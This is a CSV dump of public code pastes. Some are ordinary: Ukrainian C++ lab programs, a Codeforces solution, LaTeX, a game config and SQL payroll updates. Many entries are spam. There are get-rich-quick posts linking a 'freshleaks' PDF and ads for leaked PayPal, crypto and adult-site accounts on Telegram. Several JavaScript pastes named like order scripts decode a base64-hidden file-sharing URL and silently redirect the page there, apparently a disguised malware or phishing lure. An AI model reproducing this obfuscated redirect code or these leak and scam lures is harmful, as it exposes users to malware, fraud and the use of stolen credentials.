id,title,username,language,date,content
jHDW3pmW,EARN $900 INSTANTLY 2025⭐ GV,Expired_MRE,JavaScript,Thursday 1st of May 2025 07:07:09 AM CDT," 
Pdf https://tinyurl.com/freshleaks

EfX53hoUUP
"
gnr5FE8b,Другий семестр. Лабораторна робота №16 (Завдання 2),Lavig,C++,Thursday 1st of May 2025 07:07:06 AM CDT,"#include <iostream>
#include <windows.h>
#include <fstream>
#include <sstream>
#include <vector>
#include <format>

using namespace std;

struct Product {
    string name{};
    double quantity{};
    double price{};
    double total{};
    string code{};
    string location{};
};

void updateTotal(Product& p) {
    p.total = p.quantity * p.price;
}
void readProducts(vector<Product>& products, const string& filename) {
    ifstream fin(filename);
    if (!fin.is_open()) {
        cout << ""Не вдалося відкрити вихідний файл"";
        return;
    }
    string line;
    while (getline(fin, line)) {
        stringstream ss(line);
        string field{};
        Product p{};
        getline(ss, p.name, ';');
        getline(ss, field, ';');
        p.quantity = stod(field);
        getline(ss, field, ';');
        p.price = stod(field);
        getline(ss, field, ';');
        p.total = stod(field);
        getline(ss, p.code, ';');
        getline(ss, p.location, ';');

        products.push_back(p);
    }
    fin.close();
}
void printProducts(vector<Product>& products) {
    cout << ""Залишки на складі:"" << endl;
    cout << format(""{:^20}{:^20}{:^20}{:^20}{:^20}{:^20}\n"", ""Найменування"", ""Кількість (кг)"", ""Ціна (грн)"", ""Сума (грн)"", ""Артикул"", ""Місце розташування"");
    for (int i = 0; i < products.size(); i++) {
        Product p = products[i];
        cout << format(""{:^20}{:^20.2f}{:^20.2f}{:^20.2f}{:^20}{:^20}\n"", p.name, p.quantity, p.price, p.total, p.code, p.location);
    }
}
void addProduct(vector<Product>& products) {
    Product p;
    cout << ""Введіть найменування товару: "";
    cin.ignore();
    getline(cin, p.name);
    cout << ""Введіть кількість товару (кг): "";
    cin >> p.quantity;
    cout << ""Введіть ціну товару (грн): "";
    cin >> p.price;
    cout << ""Введіть артикул товару: "";
    cin >> p.code;
    cout << ""Введіть місце розташування товару: "";
    cin.ignore();
    getline(cin, p.location);
    updateTotal(p);
    products.push_back(p);
    cout << ""Товар додано."" << endl;
}
void editProduct(vector<Product>& products) {
    string code;
    cout << ""Введіть артикул товару для редагування: "";
    cin >> code;
    for (int i = 0; i < products.size(); i++) {
        if (products[i].code == code) {
            cout << ""Редагування товару "" << products[i].name << "":"" << endl;
            cout << ""Нове найменування: "";
            cin.ignore();
            getline(cin, products[i].name);
            cout << ""Нова кількість (кг): "";
            cin >> products[i].quantity;
            cout << ""Нова ціна (грн): "";
            cin >> products[i].price;
            cout << ""Нове місце розташування: "";
            cin.ignore();
            getline(cin, products[i].location);
            updateTotal(products[i]);
            cout << ""Товар оновлено."" << endl;
            return;
        }
    }
    cout << ""Товар з таким артикулом не знайдено."" << endl;
}
void deleteProduct(vector<Product>& products) {
    string code;
    cout << ""Введіть артикул товару для видалення: "";
    cin >> code;
    for (int i = 0; i < products.size(); i++) {
        if (products[i].code == code) {
            products.erase(products.begin() + i);
            cout << ""Товар видалено."" << endl;
            return;
        }
    }
    cout << ""Товар з таким артикулом не знайдено."" << endl;
}
void saveProducts(vector<Product>& products, const string& filename) {
    ofstream fout(filename);
    if (!fout.is_open()) {
        cout << ""Не вдалося відкрити файл для запису!"" << endl;
        return;
    }
    for (int i = 0; i < products.size(); i++) {
        Product p = products[i];
        fout << p.name << "";"" << p.quantity << "";""
            << p.price << "";"" << p.total << "";""
            << p.code << "";"" << p.location << endl;
    }
    fout.close();
    cout << ""\nДані успішно збережено!"" << endl;
}
void Menu() {
    cout << ""Меню складу"" << endl;
    cout << ""1. Перегляд товарів"" << endl;
    cout << ""2. Додати товар"" << endl;
    cout << ""3. Редагувати товар"" << endl;
    cout << ""4. Видалити товар"" << endl;
    cout << ""5. Зберегти у файл"" << endl;
    cout << ""6. Вийти"" << endl;
}
int main() {
    SetConsoleOutputCP(1251);
    SetConsoleCP(1251);
    vector<Product> products;
    readProducts(products, ""D:/files/products.txt"");
    int choice{};
    do {
        Menu();
        cout << ""Оберіть номер опції: "" << endl;
        cin >> choice;
        switch (choice) {
        case 1:
            printProducts(products);
            break;
        case 2:
            addProduct(products);
            break;
        case 3:
            editProduct(products);
            break;
        case 4:
            deleteProduct(products);
            break;
        case 5:
            saveProducts(products, ""D:/files/products.txt"");
            break;
        case 6:
            cout << ""Вихід з програми."" << endl;
            break;
        default: cout << ""Номер опції обрано неправильно. Спробуйте ще раз!"" << endl;
        }
    } while (choice != 6);
}"
K7uDN45B,Order.js,hubertzoo90,JavaScript,Thursday 1st of May 2025 07:06:31 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/52539/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
eyCHRnDv,Crypto Accounts,x2LeaF,JavaScript,Thursday 1st of May 2025 07:06:25 AM CDT,93729 Accounts Posted On https://t.me/leakzbyeminem
agK7pX3s,Make $1000 15-MINUTES  (BEGINNER) YR,Expired_MRE,JavaScript,Thursday 1st of May 2025 06:57:57 AM CDT," 
Pdf https://tinyurl.com/freshleaks

8VWeUcbOlr
"
dYEwrE5e,Market.js,hubertzoo90,JavaScript,Thursday 1st of May 2025 06:51:09 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/60347/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
8srnuNyU,PayPal with Balance,x2LeaF,JavaScript,Thursday 1st of May 2025 06:51:03 AM CDT,19109 Accounts Posted On https://t.me/leakzbyeminem
3YtBaqUZ,Другий семестр. Лабораторна робота №16 (Завдання 1),Lavig,C++,Thursday 1st of May 2025 06:51:01 AM CDT,"#include <iostream>
#include <windows.h>
#include <fstream>
#include <sstream>
#include <vector>

using namespace std;

struct Applicant {
    string surname{};
    string name{};
    string patronymic{};
    string gender{};
    string nationality{};
    int year{};
    int month{};
    int day{};
    int postal_code{};
    string country{};
    string region{};
    string district{};
    string city{};
    string street{};
    string building{};
    string apartment{};
    int mark1{};
    int mark2{};
    int mark3{};
    double threshold{};
};

void readApplicants(vector<Applicant>& applicants, const string& filename) {
    ifstream fin(filename);
    if (!fin.is_open()) {
        cout << ""Не вдалося відкрити вихідний файл"";
        return;
    }
    string line;
    while (getline(fin, line)) {
        stringstream ss(line);
        string field{};
        Applicant a{};
        getline(ss, a.surname, ';');
        getline(ss, a.name, ';');
        getline(ss, a.patronymic, ';');
        getline(ss, a.gender, ';');
        getline(ss, a.nationality, ';');
        getline(ss, field, ';');
        a.year = stoi(field);
        getline(ss, field, ';');
        a.month = stoi(field);
        getline(ss, field, ';');
        a.day = stoi(field);
        getline(ss, field, ';');
        a.postal_code = stoi(field);
        getline(ss, a.country, ';');
        getline(ss, a.region, ';');
        getline(ss, a.district, ';');
        getline(ss, a.city, ';');
        getline(ss, a.street, ';');
        getline(ss, a.building, ';');
        getline(ss, a.apartment, ';');
        getline(ss, field, ';');
        a.mark1 = stoi(field);
        getline(ss, field, ';');
        a.mark2 = stoi(field);
        getline(ss, field, ';');
        a.mark3 = stoi(field);
        getline(ss, field, ';');
        a.threshold = stod(field);
        applicants.push_back(a);
    }
    fin.close();
}
void printApplicants(vector<Applicant>& applicants) {
    cout << ""Список усіх абітурієнтів:"" << endl;
    for (int i = 0; i < applicants.size(); i++) {
        Applicant a = applicants[i];
        cout << a.surname << "" "" << a.name << "" "" << a.patronymic << "" - Пороговий бал: "" << a.threshold << endl;
    }
}
void printFilteredApplicants(vector<Applicant>& applicants) {
    cout << ""\nАбітурієнти з пороговим балом > 4:"" << endl;
    for (int i = 0; i < applicants.size(); i++) {
        Applicant a = applicants[i];
        if (a.threshold > 4.0) {
            cout << a.surname << "" "" << a.name << "" "" << a.patronymic << "" - Пороговий бал: "" << a.threshold << endl;
        }
    }
}
void saveFilteredApplicants(vector<Applicant>& applicants, const string& filename) {
    ofstream fout(filename);
    if (!fout.is_open()) {
        cout << ""Не вдалося відкрити файл для запису!"" << endl;
        return;
    }
    for (int i = 0; i < applicants.size(); i++) {
        Applicant a = applicants[i];
        if (a.threshold > 4.0) {
            fout << a.surname << "";"" << a.name << "";"" << a.patronymic << "";""
                << a.gender << "";"" << a.nationality << "";""
                << a.year << "";"" << a.month << "";"" << a.day << "";""
                << a.postal_code << "";"" << a.country << "";"" << a.region << "";""
                << a.district << "";"" << a.city << "";"" << a.street << "";""
                << a.building << "";"" << a.apartment << "";""
                << a.mark1 << "";"" << a.mark2 << "";"" << a.mark3 << "";""
                << a.threshold << endl;
        }
    }
    fout.close();
    cout << ""\nФайл з абітурієнтами, які мають пороговий бал > 4, успішно збережено!""<< endl;
}
int main() {
    SetConsoleOutputCP(1251);
    SetConsoleCP(1251);
    vector<Applicant> applicants;
    readApplicants(applicants, ""D:/files/applicants.txt"");
    printApplicants(applicants);
    printFilteredApplicants(applicants);
    saveFilteredApplicants(applicants, ""D:/files/filtered_applicants.txt"");
}"
KsMddsA5,EARN $900 INSTANTLY 2025 95,Expired_MRE,JavaScript,Thursday 1st of May 2025 06:48:44 AM CDT," 
Pdf https://tinyurl.com/freshleaks

U0xhQB0WPH
"
xjZXdAaG,Make $1000 15-MINUTES (BEGINNER) L4,Expired_MRE,JavaScript,Thursday 1st of May 2025 06:39:30 AM CDT," 
Pdf https://tinyurl.com/freshleaks

uX7oJs24PU
"
fvfLUCfK,Untitled,hubertzoo90,JavaScript,Thursday 1st of May 2025 06:35:48 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/79496/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
nLVwDkWZ,Leaked Accounts - Fresh Hits,x2LeaF,JavaScript,Thursday 1st of May 2025 06:35:39 AM CDT,85196 Accounts Posted On https://t.me/leakzbyeminem
V03MUNQq,EARN $900 INSTANTLY 2025⭐ GV,Expired_MRE,JavaScript,Thursday 1st of May 2025 06:30:17 AM CDT," 
Pdf https://tinyurl.com/freshleaks

OyHkTQDFB3
"
TK48DM0Z,Make $1000 15-MINUTES  (BEGINNER) YR,Expired_MRE,JavaScript,Thursday 1st of May 2025 06:21:04 AM CDT," 
Pdf https://tinyurl.com/freshleaks

ZlVtftrud3
"
KANWgkP5,Products.js,hubertzoo90,JavaScript,Thursday 1st of May 2025 06:20:19 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/21317/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
S7JzP07A,Chaturbate with Tokens,x2LeaF,JavaScript,Thursday 1st of May 2025 06:20:17 AM CDT,09372 Accounts Posted On https://t.me/leakzbyeminem
mUfyeGSP,2025-05-01T13:16:18.159518,powerampache,PHP,Thursday 1st of May 2025 06:16:18 AM CDT,"1.01-78 (78) - DB: 83
luci.sixsixsix.powerampache2.domain.errors.NullSessionException: Session is NULL
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository.authToken(BaseAmpacheRepository.kt:87)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository$authToken$1.invokeSuspend(Unknown Source:14)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at android.os.Handler.handleCallback(Handler.java:942)
	at android.os.Handler.dispatchMessage(Handler.java:99)
	at android.os.Looper.loopOnce(Looper.java:210)
	at android.os.Looper.loop(Looper.java:299)
	at android.app.ActivityThread.main(ActivityThread.java:8261)
	at java.lang.reflect.Method.invoke(Native Method)
	at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:559)
	at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:954)

scrobble() - generic exception {""detailMessage"":""Session is NULL"",""stackTrace"":[]}"
fvrXi3Xm,Make $1000 15-MINUTES (BEGINNER) L4,cdmghxtc1999,JavaScript,Thursday 1st of May 2025 06:11:50 AM CDT," 
Pdf https://tinyurl.com/freshleaks

nzb1Pb57qL
"
ap7Xa2Fj,Order.js,hubertzoo90,JavaScript,Thursday 1st of May 2025 06:04:58 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/65271/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Z66A3tfh,Crypto Accounts,x2LeaF,JavaScript,Thursday 1st of May 2025 06:04:55 AM CDT,71230 Accounts Posted On https://t.me/leakzbyeminem
Qq7SvVS0,dataNone,TestGuy1,JSON,Thursday 1st of May 2025 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'c499ddb58a52a76f517e78bf4ca62e1657d1192a113a13d6df7f718dc1b343489337207104e3fe8b17177e451823c34f613a614bd596ce43c05b1b93de6d6fbc32eafdadb4b941a5f9409648b496aed09160ee6d7b04e5273e2525b044cd89ea682a282fd0e38fe2b24d9053e8fd5ce2f8d095c0c64c98e35f350971b726f46c',
  otherdata: [
    '15d4457edbd6038766d1aa184a6a4371',
    '9a3c68e0dbaaff57c63945cd4fa7caa4',
    '8a3d8fd3ca6d6ed4b5739f9eac5883a6',
    'aedfcc8c5a83e091c0cfdc1e35adf102',
    '7e350e7f6417139333bbaecd7c6ef4fe',
    '5fafd05082a9cf05cf999c2d8b5e3733',
    'b20c315edc0143b154c02ab3b2e6b3b6',
    '8eb2d919e3fca72df75a62db344507c9'
  ]
}"
73DwNLqg,CF1731C,pb_jiang,C++,Thursday 1st of May 2025 05:55:47 AM CDT,"// Problem: C. Even Subarrays
// Contest: Codeforces - Codeforces Round 841 (Div. 2) and Divide by Zero 2022
// URL: https://codeforces.com/problemset/problem/1731/C
// Memory Limit: 256 MB
// Time Limit: 2500 ms
//
// Powered by CP Editor (https://cpeditor.org)

#include <assert.h>
#include <bits/stdc++.h>
using namespace std;
#ifndef __DEBUG__
#define dbg(...) 42
#endif
template <class T> using mpq = priority_queue<T, vector<T>, greater<T>>;

namespace rngs = std::ranges;
using ll = long long;
using a2l = array<ll, 2>;
using pll = pair<ll, ll>;
using vl = vector<ll>;

void solve()
{
    ll n;
    cin >> n;
    vl a(n);
    for (auto &x : a)
        cin >> x;

    ll tot = n * (n + 1) / 2, sub = 0;
    vl cnt(2 * n);
    cnt[0] = 1;

    for (ll i = 0, sum = 0; i < n; ++i) {
        sum = sum ^ a[i];
        for (ll j = 0; j * j < 2 * n; ++j) {
            ll tg = sum ^ (j * j);
            /*
            // TLE with cnt a map
            if (cnt.count(tg))
                dbg(tg, sum, j * j, cnt[tg]), sub += cnt[tg];
            */
            if (tg < 2 * n)
                sub += cnt[tg];
        }
        cnt[sum] += 1;
    }

    dbg(tot, sub);
    cout << tot - sub << '\n';
}

int main(int argc, char **argv)
{
    std::ios::sync_with_stdio(false);
    std::cin.tie(nullptr);

    ll t;
    cin >> t;
    while (t--)
        solve();

    return 0;
};
"
4SFSwC56,Untitled,mayankjoin3,Latex,Thursday 1st of May 2025 05:52:06 AM CDT,"\documentclass{ieeeaccess}
% \usepackage{longtable}
% \usepackage[utf8]{inputenc}
% \usepackage[a4paper,left=2.9cm,right=2cm,top=2cm,bottom=2.25cm]{geometry}
\usepackage{caption}
% \usepackage{lipsum} % for dummy text
% \usepackage{graphicx}
% \usepackage{mathtools} % amsmath with extensions
% \usepackage{amsfonts} % (otherwise \mathbb does nothing)
% \usepackage{amsmath}
% \usepackage{amssymb}
% % \usepackage{natbib}
% \usepackage{longtable}
% \usepackage{lipsum}
% \usepackage{float}
% \usepackage[utf8]{inputenc}
\usepackage{longtable}
% \usepackage{xcolor}
% \usepackage{xcolor,colortbl}
\usepackage[usenames,dvipsnames]{xcolor,colortbl}


% \definecolor{LightBlue}{rgb}{0.88,0.92,0.96} % Define a light blue color
\usepackage{fancyhdr}
\pagestyle{fancy}
\fancyhf{}
% \renewcommand{\headrulewidth}{0pt} % Removes the header rule

\usepackage{booktabs} % For prettier tables
\usepackage{makecell} % Allows for line breaks within table cells
\usepackage{tabularx} % For tables that span the width of the page
\usepackage{subcaption}
\captionsetup{compatibility=false}
% \usepackage[sort&compress,square,comma,authoryear]{natbib}
\usepackage{authblk}
% \usepackage{svg}
% \usepackage{lineno}
% \linenumbers
% \usepackage{gensymb}%https://www.overleaf.com/project/6544eab4f0a2f7eb166b931b
% \usepackage{amsmath}
% \usepackage{algpseudocode}
\usepackage{algorithm}
\usepackage{algorithmic}
% \usepackage{subfig}
\usepackage{url}
\usepackage{comment}
% \usepackage{lineno}
% % \linenumbers
\usepackage[hidelinks]{hyperref}
\usepackage{multirow}
\usepackage{cite}
\usepackage{amsmath,amssymb,amsfonts}
\usepackage{algorithmic}
\usepackage{graphicx}
\usepackage{textcomp}


These are packages causing conflict. Please fix them and also fix this algo 


\begin{algorithm}[!htb]
\caption{Balance Dataset with ADASYN}
\label{algo:ADASYN}
\DontPrintSemicolon

\KwIn{Imbalanced DataFrame \texttt{df}}
\KwOut{Balanced DataFrame \texttt{balanced\_df}}

\BlankLine
\textbf{Print:} ``Applying ADASYN for class balancing...'' \;

\BlankLine
\textbf{Prepare features and label:} \;
\If{\texttt{""label""} in df.columns}{
    $X \leftarrow \texttt{df.drop([""label"", ""attack\_cat""], axis=1)}$ \;
}
\Else{
    $X \leftarrow \texttt{df.drop([""attack\_cat""], axis=1)}$ \;
}
$y \leftarrow \texttt{df[""attack\_cat""]}$ \;

\BlankLine
\textbf{Apply ADASYN:} \;
adasyn $\leftarrow$ ADASYN(random\_state=42, n\_neighbors=5) \;
$X_{\text{resampled}}, y_{\text{resampled}} \leftarrow$ adasyn.fit\_resample($X$, $y$) \;

\BlankLine
\textbf{Create balanced dataframe:} \;
balanced\_df $\leftarrow$ DataFrame($X_{\text{resampled}}$, columns=$X$.columns) \;
balanced\_df[``attack\_cat""] $\leftarrow y_{\text{resampled}}$ \;

\BlankLine
\textbf{Print:} ``After ADASYN: \texttt{balanced\_df.shape[0]} records'' \;
\textbf{Print:} ``Balanced attack distribution: \texttt{balanced\_df[""attack\_cat""].value\_counts().to\_dict()}'' \;

\Return balanced\_df \;

\end{algorithm}"
h661NdXP,Market.js,hubertzoo90,JavaScript,Thursday 1st of May 2025 05:49:35 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/71563/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
TRcX5Mc2,PayPal with Balance,x2LeaF,JavaScript,Thursday 1st of May 2025 05:49:33 AM CDT,27611 Accounts Posted On https://t.me/leakzbyeminem
Ni7bbZhv,Untitled,hubertzoo90,JavaScript,Thursday 1st of May 2025 05:34:13 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/05236/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
rz5gLYNz,Leaked Accounts - Fresh Hits,x2LeaF,JavaScript,Thursday 1st of May 2025 05:34:12 AM CDT,30657 Accounts Posted On https://t.me/leakzbyeminem
xG9UhUq7,ldf camo,Gamenator,C++,Thursday 1st of May 2025 05:33:44 AM CDT,"//cfgweapon
class FLPMC_combatspcfed: U_I_E_Uniform_01_F{
              author= ""Gamenator"";
              scope=2;
              scopeArsenal=2;
              allowedSlots[]={901};
              displayName=""Combat Fatigues (Pacific Woodland)"";
              model = ""\A3\Characters_F\Common\Suitpacks\suitpack_original_F.p3d"";
              hiddenSelectionsTextures[]=
            {
                      ""Uniforms\fed\spc_fed_co.paa"",
                      ""Uniforms\fed\clothing_co_fed.paa""
            };
              class ItemInfo: UniformItem
              {
                  uniformModel=""-"";
                  uniformClass=""FLPMC_combatspcfedcv"";
                  containerClass=""Supply40"";
                  mass=40;
              };



        };
//cfgvehicle
class FLPMC_combatspcfedcv: I_E_Soldier_F
            {
              author= ""Gamenator"";
              scope = 1;
              scopeCurator = 0;
              hiddenSelections[]=
                  {
                  ""camo"",
				  ""camo2"",
				  ""insignia""
                  };
                  hiddenSelectionsTextures[] =
                  {
                      ""Uniforms\fed\spc_fed_co.paa"",         // torso texture
                      ""Uniforms\fed\clothing_co_fed.paa""     // pants texture
                  };
                  uniformClass= ""FLPMC_combatspcfed""; //CfgWeapons classname here
              
              };"
5PjqDQXu,Products.js,hubertzoo90,JavaScript,Thursday 1st of May 2025 05:18:51 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/46820/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
YXDi8itr,Chaturbate with Tokens,x2LeaF,JavaScript,Thursday 1st of May 2025 05:18:48 AM CDT,77755 Accounts Posted On https://t.me/leakzbyeminem
9YcfRMYL,Untitled,Locative,SQL,Thursday 1st of May 2025 05:13:06 AM CDT,"-- [ Оплата за: апрель]
 
--------- [ Отработанное время: ]
 
Locative: 3 (FUN) 126 (x100) -- 129
Зилиус:  0 (x100) -- 0
Khyntia: 27 (FUN), 0 (x100) -- 27
jegerm  - EN GM: 161 (FUN), 3 (x100) -- 164
Mairena: 0 (FUN) 100 (x100) -- 100
Lorad: 0 (x100) -- 0
Adegbuyi 15 (FUN) -- 15


--------- [ Бонусы: ]

UPDATE `bonus` SET `gold`=gold+0 WHERE `id`='229884'; -- Зилиус (ГМ)
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (229884, NOW(), 0, '+0 золотых бонусов - з/п ГМ Зилиус за апрель');

UPDATE `bonus` SET `gold`=gold+0 WHERE `id`='949105'; -- Khyntia (ГМ).
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (949105, NOW(), 0, '+0 золотых бонусов - з/п ГМ Khyntia за апрель'); 

UPDATE `bonus` SET `gold`=gold+3500 WHERE `id`='455260'; -- Jegerm (EN GM) + md FB.
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (455260, NOW(), 3500, '+3500 золотых бонусов - з/п ГМ Jegerm за апрель'); 


-- Модератор чата

UPDATE `bonus` SET `gold`=gold+100 WHERE `id`='1795307'; -- Adegbuyi
